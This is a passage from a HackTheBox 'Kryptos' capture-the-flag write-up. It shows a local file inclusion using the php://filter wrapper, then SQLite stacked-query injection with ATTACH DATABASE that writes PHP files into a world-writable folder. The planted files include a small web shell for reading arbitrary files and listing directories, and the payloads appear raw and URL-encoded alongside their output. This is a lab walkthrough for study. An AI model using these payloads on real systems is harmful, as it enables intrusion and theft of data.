	<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">outfile</span><span class="p">,</span><span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
		<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
		<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
	<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[*] Result :"</span><span class="p">)</span>
	<span class="n">system</span><span class="p">(</span><span class="s">"cat ./"</span> <span class="o">+</span> <span class="n">outfile</span><span class="p">)</span>
	<span class="n">N</span><span class="o">+=</span><span class="mi">1</span>
</code></pre></div></div>
<p>This script sends a request to <code class="language-plaintext highlighter-rouge">/encrypt.php</code> with the given <code class="language-plaintext highlighter-rouge">url</code>, then it retrieves the encrypted data and saves it in a file. It sends another request to <code class="language-plaintext highlighter-rouge">/encrypt.php</code> with the <code class="language-plaintext highlighter-rouge">url</code> to the encrypted file then it retrieves the decrypted data, saves it in a file then it prints it.<br>
It saves encrypted files and decrypted files and names them according to this pattern : <code class="language-plaintext highlighter-rouge">ENCRYPTED_N</code>, <code class="language-plaintext highlighter-rouge">OUTPUT_N</code> where <code class="language-plaintext highlighter-rouge">N</code> is a number which is incremented by 1 every request.<br>
I created a directory and called it <code class="language-plaintext highlighter-rouge">ssrf</code>, I ran a python server there then I ran my script :
<br><img src="/images/hackthebox/kryptos/16.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">/dev</code> :</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/
[*] Result :
<span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"menu"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"index.php"</span><span class="nt">&gt;</span>Main Page<span class="nt">&lt;/a&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"index.php?view=about"</span><span class="nt">&gt;</span>About<span class="nt">&lt;/a&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"index.php?view=todo"</span><span class="nt">&gt;</span>ToDo<span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
<p>I went to <code class="language-plaintext highlighter-rouge">/dev/index.php?view=todo</code> and I found some interesting stuff :</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/index.php?view=todo
[*] Result :
<span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"menu"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"index.php"</span><span class="nt">&gt;</span>Main Page<span class="nt">&lt;/a&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"index.php?view=about"</span><span class="nt">&gt;</span>About<span class="nt">&lt;/a&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"index.php?view=todo"</span><span class="nt">&gt;</span>ToDo<span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;h3&gt;</span>ToDo List:<span class="nt">&lt;/h3&gt;</span>
1) Remove sqlite_test_page.php
<span class="nt">&lt;br&gt;</span>2) Remove world writable folder which was used for sqlite testing
<span class="nt">&lt;br&gt;</span>3) Do the needful
<span class="nt">&lt;h3&gt;</span> Done: <span class="nt">&lt;/h3&gt;</span>
1) Restrict access to /dev
<span class="nt">&lt;br&gt;</span>2) Disable dangerous PHP functions

<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
<p>There were 2 “done” things in this todo list : restricting access to <code class="language-plaintext highlighter-rouge">/dev</code> and disabling dangerous <code class="language-plaintext highlighter-rouge">php</code> functions which will be a problem if we could somehow upload/write files. However the things that haven’t been done yet were removing a <code class="language-plaintext highlighter-rouge">php</code> page called <code class="language-plaintext highlighter-rouge">sqlite_test_page.php</code> and removing a folder writable by everyone which was used for <code class="language-plaintext highlighter-rouge">sqlite</code> testing, probably used by the <code class="language-plaintext highlighter-rouge">sqlite_test_page.php</code>.
<br>I went to <code class="language-plaintext highlighter-rouge">/dev/sqlite_test_page.php</code> but I only got an empty <code class="language-plaintext highlighter-rouge">html</code> page :</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/sqlite_test_page.php
[*] Result :
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<h2 id="lfi">LFI</h2>
<p>As we saw, <code class="language-plaintext highlighter-rouge">/dev/index.php</code> had a parameter called <code class="language-plaintext highlighter-rouge">view</code> which was used to view other pages, There was a possible local file inclusion vulnerability here so I tested on <code class="language-plaintext highlighter-rouge">/index.php</code> and it worked :</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/index.php?view=../index    
[*] Result :
<span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"menu"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"index.php"</span><span class="nt">&gt;</span>Main Page<span class="nt">&lt;/a&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"index.php?view=about"</span><span class="nt">&gt;</span>About<span class="nt">&lt;/a&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"index.php?view=todo"</span><span class="nt">&gt;</span>ToDo<span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
  <span class="nt">&lt;title&gt;</span>Cryptor Login<span class="nt">&lt;/title&gt;</span>
  <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"css/bootstrap.min.css"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container-fluid"</span><span class="nt">&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;h2&gt;</span>Cryptor Login<span class="nt">&lt;/h2&gt;</span>
  <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">""</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"Username"</span><span class="nt">&gt;</span>Username:<span class="nt">&lt;/label&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"username"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">placeholder=</span><span class="s">"Enter username"</span><span class="nt">&gt;</span>                                                                                                         
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"password"</span><span class="nt">&gt;</span>Password:<span class="nt">&lt;/label&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"password"</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">placeholder=</span><span class="s">"Enter password"</span><span class="nt">&gt;</span>                                                                                                     
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">id=</span><span class="s">"db"</span> <span class="na">name=</span><span class="s">"db"</span> <span class="na">value=</span><span class="s">"cryptor"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"token"</span> <span class="na">value=</span><span class="s">"66fc3775dd9b849f2522417e51bd12cffc0e0196a7deb43b1cd9756b65d09e91"</span> <span class="nt">/&gt;</span>                                                                                                 
    <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"btn btn-primary"</span> <span class="na">name=</span><span class="s">"login"</span><span class="nt">&gt;</span>Submit<span class="nt">&lt;/button&gt;</span>
  <span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
<p>I wanted to read the <code class="language-plaintext highlighter-rouge">php</code> code of <code class="language-plaintext highlighter-rouge">sqlite_test_page.php</code> to know what’s in there so I tried the <code class="language-plaintext highlighter-rouge">php://filter/convert.base64-encode</code> wrapper (got it from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" target="_blank" rel="noopener noreferrer">here</a>) and it worked :</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/index.php?view=php://filter/convert.base64-encode/resource=sqlite_test_page
[*] Result :
<span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"menu"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"index.php"</span><span class="nt">&gt;</span>Main Page<span class="nt">&lt;/a&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"index.php?view=about"</span><span class="nt">&gt;</span>About<span class="nt">&lt;/a&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"index.php?view=todo"</span><span class="nt">&gt;</span>ToDo<span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
PGh0bWw+CjxoZWFkPjwvaGVhZD4KPGJvZHk+Cjw/cGhwCiRub19yZXN1bHRzID0gJF9HRVRbJ25vX3Jlc3VsdHMnXTsKJGJvb2tpZCA9ICRfR0VUWydib29raWQnXTsKJHF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gYm9va3MgV0hFUkUgaWQ9Ii4kYm9va2lkOwppZiAoaXNzZXQoJGJvb2tpZCkpIHsKICAgY2xhc3MgTXlEQiBleHRlbmRzIFNRTGl0ZTMKICAgewogICAgICBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpCiAgICAgIHsKCSAvLyBUaGlzIGZvbGRlciBpcyB3b3JsZCB3cml0YWJsZSAtIHRvIGJlIGFibGUgdG8gY3JlYXRlL21vZGlmeSBkYXRhYmFzZXMgZnJvbSBQSFAgY29kZQogICAgICAgICAkdGhpcy0+b3BlbignZDllMjhhZmNmMGIyNzRhNWUwNTQyYWJiNjdkYjA3ODQvYm9va3MuZGInKTsKICAgICAgfQogICB9CiAgICRkYiA9IG5ldyBNeURCKCk7CiAgIGlmKCEkZGIpewogICAgICBlY2hvICRkYi0+bGFzdEVycm9yTXNnKCk7CiAgIH0gZWxzZSB7CiAgICAgIGVjaG8gIk9wZW5lZCBkYXRhYmFzZSBzdWNjZXNzZnVsbHlcbiI7CiAgIH0KICAgZWNobyAiUXVlcnkgOiAiLiRxdWVyeS4iXG4iOwoKaWYgKGlzc2V0KCRub19yZXN1bHRzKSkgewogICAkcmV0ID0gJGRiLT5leGVjKCRxdWVyeSk7CiAgIGlmKCRyZXQ9PUZBTFNFKQogICAgewoJZWNobyAiRXJyb3IgOiAiLiRkYi0+bGFzdEVycm9yTXNnKCk7CiAgICB9Cn0KZWxzZQp7CiAgICRyZXQgPSAkZGItPnF1ZXJ5KCRxdWVyeSk7CiAgIHdoaWxlKCRyb3cgPSAkcmV0LT5mZXRjaEFycmF5KFNRTElURTNfQVNTT0MpICl7CiAgICAgIGVjaG8gIk5hbWUgPSAiLiAkcm93WyduYW1lJ10gLiAiXG4iOwogICB9CiAgIGlmKCRyZXQ9PUZBTFNFKQogICAgewoJZWNobyAiRXJyb3IgOiAiLiRkYi0+bGFzdEVycm9yTXNnKCk7CiAgICB9CiAgICRkYi0+Y2xvc2UoKTsKfQp9Cj8+CjwvYm9keT4KPC9odG1sPgo=<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<h2 id="sqli--arbitrary-file-write">SQLI –&gt; Arbitrary File Write</h2>
<p><code class="language-plaintext highlighter-rouge">sqlite_test_page.php</code> :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$no_results</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'no_results'</span><span class="p">];</span>
<span class="nv">$bookid</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'bookid'</span><span class="p">];</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM books WHERE id="</span><span class="mf">.</span><span class="nv">$bookid</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$bookid</span><span class="p">))</span> <span class="p">{</span>
   <span class="kd">class</span> <span class="nc">MyDB</span> <span class="kd">extends</span> <span class="nc">SQLite3</span>
   <span class="p">{</span>
      <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span>
      <span class="p">{</span>
	 <span class="c1">// This folder is world writable - to be able to create/modify databases from PHP code</span>
         <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">open</span><span class="p">(</span><span class="s1">'d9e28afcf0b274a5e0542abb67db0784/books.db'</span><span class="p">);</span>
      <span class="p">}</span>
   <span class="p">}</span>
   <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MyDB</span><span class="p">();</span>
   <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$db</span><span class="p">){</span>
      <span class="k">echo</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">lastErrorMsg</span><span class="p">();</span>
   <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">"Opened database successfully</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="k">echo</span> <span class="s2">"Query : "</span><span class="mf">.</span><span class="nv">$query</span><span class="mf">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$no_results</span><span class="p">))</span> <span class="p">{</span>
   <span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
   <span class="k">if</span><span class="p">(</span><span class="nv">$ret</span><span class="o">==</span><span class="kc">FALSE</span><span class="p">)</span>
    <span class="p">{</span>
	<span class="k">echo</span> <span class="s2">"Error : "</span><span class="mf">.</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">lastErrorMsg</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
   <span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
   <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$ret</span><span class="o">-&gt;</span><span class="nf">fetchArray</span><span class="p">(</span><span class="no">SQLITE3_ASSOC</span><span class="p">)</span> <span class="p">){</span>
      <span class="k">echo</span> <span class="s2">"Name = "</span><span class="mf">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="k">if</span><span class="p">(</span><span class="nv">$ret</span><span class="o">==</span><span class="kc">FALSE</span><span class="p">)</span>
    <span class="p">{</span>
	<span class="k">echo</span> <span class="s2">"Error : "</span><span class="mf">.</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">lastErrorMsg</span><span class="p">();</span>
    <span class="p">}</span>
   <span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">close</span><span class="p">();</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p>It takes two parameters : <code class="language-plaintext highlighter-rouge">no_results</code> and <code class="language-plaintext highlighter-rouge">bookid</code> :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$no_results</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'no_results'</span><span class="p">];</span>
<span class="nv">$bookid</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'bookid'</span><span class="p">];</span>
</code></pre></div></div>
<p>And it appends <code class="language-plaintext highlighter-rouge">bookid</code> to a <code class="language-plaintext highlighter-rouge">sqlite</code> query without any filtering :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM books WHERE id="</span><span class="mf">.</span><span class="nv">$bookid</span><span class="p">;</span>
</code></pre></div></div>
<p>We also can see the name of the writable directory <code class="language-plaintext highlighter-rouge">d9e28afcf0b274a5e0542abb67db0784</code> :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c1">// This folder is world writable - to be able to create/modify databases from PHP code</span>
         <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">open</span><span class="p">(</span><span class="s1">'d9e28afcf0b274a5e0542abb67db0784/books.db'</span><span class="p">);</span>
</code></pre></div></div>
<p>With this <code class="language-plaintext highlighter-rouge">SQL</code> injection and the name of a writable directory, we can use the <code class="language-plaintext highlighter-rouge">SQLite</code> command <code class="language-plaintext highlighter-rouge">Attach Database</code> to write files (got it from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md" target="_blank" rel="noopener noreferrer">here</a>).<br>
I tried a test file first so the payload was like this :</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="p">;</span><span class="n">ATTACH</span> <span class="k">DATABASE</span> <span class="s1">'d9e28afcf0b274a5e0542abb67db0784/test.php'</span> <span class="k">AS</span> <span class="n">test</span><span class="p">;</span><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">test</span><span class="p">.</span><span class="n">pwn</span> <span class="p">(</span><span class="n">dataz</span> <span class="nb">text</span><span class="p">);</span><span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">test</span><span class="p">.</span><span class="n">pwn</span> <span class="p">(</span><span class="n">dataz</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="s1">'&lt;?php echo "test" ?&gt;'</span><span class="p">);</span>
</code></pre></div></div>
<p>First attempt failed apparently because of encoding issues so I <code class="language-plaintext highlighter-rouge">url</code>-encoded the payload and tried again:</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/sqlite_test_page.php?no_results=FALSE<span class="err">&amp;</span>bookid=%31%3b%41%54%54%41%43%48%20%44%41%54%41%42%41%53%45%20%27%64%39%65%32%38%61%66%63%66%30%62%32%37%34%61%35%65%30%35%34%32%61%62%62%36%37%64%62%30%37%38%34%2f%74%65%73%74%2e%70%68%70%27%20%41%53%20%74%65%73%74%3b%43%52%45%41%54%45%20%54%41%42%4c%45%20%74%65%73%74%2e%70%77%6e%20%28%64%61%74%61%7a%20%74%65%78%74%29%3b%49%4e%53%45%52%54%20%49%4e%54%4f%20%74%65%73%74%2e%70%77%6e%20%28%64%61%74%61%7a%29%20%56%41%4c%55%45%53%20%28%27%3c%3f%70%68%70%20%65%63%68%6f%20%22%74%65%73%74%22%20%3f%3e%27%29%3b
[*] Result :
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
Opened database successfully
Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/test.php' AS test;CREATE TABLE test.pwn (dataz text);INSERT INTO test.pwn (dataz) VALUES ('<span class="cp">&lt;?php echo "test" ?&gt;</span>');
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
<p>The file was successfully created :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test.php
[*] Result :
test
</code></pre></div></div>

<h2 id="arbitrary-file-read">Arbitrary File Read</h2>
<p>We know that dangerous <code class="language-plaintext highlighter-rouge">php</code> functions are disabled, but let’s check which functions are exactly disabled, I overwrote my <code class="language-plaintext highlighter-rouge">test.php</code> file and made it call <code class="language-plaintext highlighter-rouge">phpinfo()</code> instead of printing <code class="language-plaintext highlighter-rouge">test</code> :</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/sqlite_test_page.php?no_results=FALSE<span class="err">&amp;</span>bookid=%31%3b%41%54%54%41%43%48%20%44%41%54%41%42%41%53%45%20%27%64%39%65%32%38%61%66%63%66%30%62%32%37%34%61%35%65%30%35%34%32%61%62%62%36%37%64%62%30%37%38%34%2f%74%65%73%74%2e%70%68%70%27%20%41%53%20%74%65%73%74%3b%43%52%45%41%54%45%20%54%41%42%4c%45%20%74%65%73%74%2e%70%77%6e%20%28%64%61%74%61%7a%20%74%65%78%74%29%3b%49%4e%53%45%52%54%20%49%4e%54%4f%20%74%65%73%74%2e%70%77%6e%20%28%64%61%74%61%7a%29%20%56%41%4c%55%45%53%20%28%27%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%20%3f%3e%27%29%3b
[*] Result :
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
Opened database successfully
Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/test.php' AS test;CREATE TABLE test.pwn (dataz text);INSERT INTO test.pwn (dataz) VALUES ('<span class="cp">&lt;?php phpinfo(); ?&gt;</span>');
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
<p>Then I requested :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test.php
</code></pre></div></div>
<p>and got the <code class="language-plaintext highlighter-rouge">phpinfo</code> page. It’s a very long page, I opened it in <code class="language-plaintext highlighter-rouge">firefox</code> and here’s the disabled functions part :
<br><img src="/images/hackthebox/kryptos/17.png" alt="" class="align-center"><br><br>
Almost any function that can get us code execution is disabled, but <code class="language-plaintext highlighter-rouge">scandir()</code> and <code class="language-plaintext highlighter-rouge">file_get_contents()</code> aren’t disabled, I wrote a <code class="language-plaintext highlighter-rouge">php</code> file that takes <code class="language-plaintext highlighter-rouge">file</code> and <code class="language-plaintext highlighter-rouge">dir</code> parameters to read a file or list a directory.<br></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">print_r</span><span class="p">(</span><span class="nb">scandir</span><span class="p">(</span><span class="s2">"</span><span class="nv">$_GET[dir]</span><span class="s2">"</span><span class="p">));</span> <span class="nb">print_r</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"</span><span class="nv">$_GET[file]</span><span class="s2">"</span><span class="p">));</span> <span class="cp">?&gt;</span>
</code></pre></div></div>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/sqlite_test_page.php?no_results=FALSE<span class="err">&amp;</span>bookid=%31%3b%41%54%54%41%43%48%20%44%41%54%41%42%41%53%45%20%27%64%39%65%32%38%61%66%63%66%30%62%32%37%34%61%35%65%30%35%34%32%61%62%62%36%37%64%62%30%37%38%34%2f%72%69%63%6b%2e%70%68%70%27%20%41%53%20%72%69%63%6b%3b%43%52%45%41%54%45%20%54%41%42%4c%45%20%72%69%63%6b%2e%70%77%6e%20%28%64%61%74%61%7a%20%74%65%78%74%29%3b%49%4e%53%45%52%54%20%49%4e%54%4f%20%72%69%63%6b%2e%70%77%6e%20%28%64%61%74%61%7a%29%20%56%41%4c%55%45%53%20%28%27%3c%3f%70%68%70%20%70%72%69%6e%74%5f%72%28%73%63%61%6e%64%69%72%28%22%24%5f%47%45%54%5b%64%69%72%5d%22%29%29%3b%20%70%72%69%6e%74%5f%72%28%66%69%6c%65%5f%67%65%74%5f%63%6f%6e%74%65%6e%74%73%28%22%24%5f%47%45%54%5b%66%69%6c%65%5d%22%29%29%3b%20%3f%3e%27%29%3b                                                                                
[*] Result :
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
Opened database successfully
Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/rick.php' AS rick;CREATE TABLE rick.pwn (dataz text);INSERT INTO rick.pwn (dataz) VALUES ('<span class="cp">&lt;?php print_r(scandir("$_GET[dir]")); print_r(file_get_contents("$_GET[file]")); ?&gt;</span>');
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
<p>Let’s test :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/rick.php?dir=./
[*] Result :
V3ArraypwnpwnCREATE TABLE pwn (dataz text)
(
    [0] =&gt; .
    [1] =&gt; ..
    [2] =&gt; books.db
    [3] =&gt; rick.php
    [4] =&gt; test.php
)
[?] URL : http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/rick.php?file=./rick.php
[*] Result :
V3<span class="cp">&lt;?php</span> <span class="nb">print_r</span><span class="p">(</span><span class="nb">scandir</span><span class="p">(</span><span class="s2">"</span><span class="nv">$_GET[dir]</span><span class="s2">"</span><span class="p">));</span> <span class="nb">print_r</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"</span><span class="nv">$_GET[file]</span><span class="s2">"</span><span class="p">));</span> <span class="cp">?&gt;</span>
</code></pre></div></div>
<p>It’s working fine, but as you can see it prints some weird characters which i guess are caused by the <code class="language-plaintext highlighter-rouge">sqlite</code> query.<br>
In <code class="language-plaintext highlighter-rouge">/home</code> there was a directory for a user called <code class="language-plaintext highlighter-rouge">rijndael</code> :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">?</span><span class="p">]</span> <span class="no">URL</span> <span class="o">:</span> <span class="n">http</span><span class="o">://</span><span class="mf">127.0.0.1</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">d9e28afcf0b274a5e0542abb67db0784</span><span class="o">/</span><span class="n">rick</span><span class="mf">.</span><span class="n">php</span><span class="o">?</span><span class="n">dir</span><span class="o">=/</span><span class="n">home</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nc">Result</span> <span class="o">:</span>
<span class="nc">V3ArraypwnpwnCREATE</span> <span class="no">TABLE</span> <span class="nf">pwn</span> <span class="p">(</span><span class="n">dataz</span> <span class="n">text</span><span class="p">)</span>
<span class="p">(</span>
    <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mf">.</span>
    <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mf">..</span>
    <span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">rijndael</span>
<span class="p">)</span>
